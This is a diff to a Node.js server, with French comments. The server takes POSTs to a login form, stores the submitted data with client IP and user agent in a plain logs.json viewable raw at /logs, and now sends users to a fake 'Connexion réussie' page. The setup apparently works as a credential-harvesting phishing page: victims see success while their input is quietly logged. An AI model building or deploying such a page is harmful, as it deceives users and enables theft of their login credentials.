@@ -42,6 +42,7 @@ function getClientIp (req) {
 }
 
 const formPath = path.join(__dirname, 'public', 'login.html')
+const successPath = path.join(__dirname, 'public', 'success.html')
 const cssPath = path.join(__dirname, 'public', 'style.css')
 const jsPath = path.join(__dirname, 'public', 'app.js')
 
@@ -76,7 +77,7 @@ const server = http.createServer(async (req, res) => {
     return sendStatic(res, jsPath, MINE['.js'])
   }
 
-  // POST /login -> persiste les données -> redirige 303 vers /logs.
+   // POST /login -> persiste les données -> redirige 303 vers /success.
   if (req.method === 'POST' && p === '/login') {
     const chunks = []
     for await (const chunk of req) chunks.push(chunk)
@@ -93,11 +94,16 @@ const server = http.createServer(async (req, res) => {
       user_agent: req.headers['user-agent'] || ''
     })
 
-    res.writeHead(303, { Location: '/logs' })
+    res.writeHead(303, { Location: '/success' })
     return res.end()
   }
 
-  // GET /logs -> affiche les données brutes (non chiffrées) depuis logs.json.
+   // GET /success -> page "Connexion réussie" (redirection après POST /login).
+  if (req.method === 'GET' && p === '/success') {
+    return sendStatic(res, successPath, MINE['.html'])
+  }
+
+   // GET /logs -> affiche les données brutes (non chiffrées) depuis logs.json.
   if (req.method === 'GET' && p === '/logs') {
     await ensureLogs()
     const logs = await readLogs()
